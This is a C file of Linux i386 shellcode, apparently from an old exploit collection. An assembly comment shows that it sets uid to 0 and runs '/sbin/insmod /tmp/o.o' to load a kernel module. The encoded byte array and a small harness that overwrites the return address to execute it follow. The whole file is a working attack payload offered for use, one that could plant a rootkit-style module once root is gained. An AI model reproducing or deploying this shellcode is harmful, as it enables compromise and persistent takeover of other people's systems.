/* The shellcode sets uid == 0 and loads the kernel module from /tmp/o.o

   size = 67 bytes
   OS	= Linux i386
 		written by /rootteam/dev0id (rootteam.void.ru)
				dev0id@uncompiled.com

BITS	32

jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	xor	ebx,ebx
	mov	al,23
	int	0x80
	mov byte [esi+12],al
	mov byte [esi+21],al
	mov long [esi+22],esi
	lea	 ebx,[esi+13]
	mov long [esi+26],ebx
	mov long [esi+30],eax
	mov 	al,0x0b
	mov	ebx,esi
	lea	ecx,[esi+22]
	lea	edx,[esi+30]
	int	0x80


callme:
	call	main
	db '/sbin/insmod#/tmp/o.o'
*/

char shellcode[] =
	"\xeb\x27\x5e\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x88\x46\x0c\x88"
	"\x46\x15\x89\x76\x16\x8d\x5e\x0d\x89\x5e\x1a\x89\x46\x1e\xb0"
	"\x0b\x89\xf3\x8d\x4e\x16\x8d\x56\x1e\xcd\x80\xe8\xd4\xff\xff"
	"\xff\x2f\x73\x62\x69\x6e\x2f\x69\x6e\x73\x6d\x6f\x64\x23\x2f"
	"\x74\x6d\x70\x2f\x6f\x2e\x6f";
int
main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}